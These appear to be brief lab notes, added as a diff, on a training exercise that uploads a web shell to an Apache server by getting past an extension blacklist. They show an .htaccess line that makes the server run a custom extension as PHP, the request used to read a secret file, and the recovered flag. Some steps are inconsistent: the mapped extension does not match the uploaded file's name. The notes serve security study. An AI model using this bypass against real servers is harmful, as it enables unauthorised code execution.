@@ -1,0 +1,34 @@
+Lab #4: Web shell upload via extension blacklist bypass
+
+End goal: Find content of /home/carlos/secret
+
+Analysis:
+
+1. Get images path traversal
+
+GET /files/avatars/images.jpeg
+
+2. Upload php file
+
+--> Sorry, php files are not allowed Sorry, there was an error uploading your file.
+
+we are talking to Apache server
+
+- Go to POST /my-account/avatar
+    filename = .htaccess --> file cấu hình của web server Apache (. -> file ẩn)
+
+    content-type = text/plain
+
+    file content -> AddType application/x-httpd-php .l33t
+
+
+Go to the orginal php file upload: filename="index.index"
+-> Successful, the php file has been uploaded
+
+3. Find the content 
+
+Go to (1)
+
+GET /files/avatars/index.index
+
+ZSlzFjwBHVUXoaJPCrRbWzW8QVcZNPEV
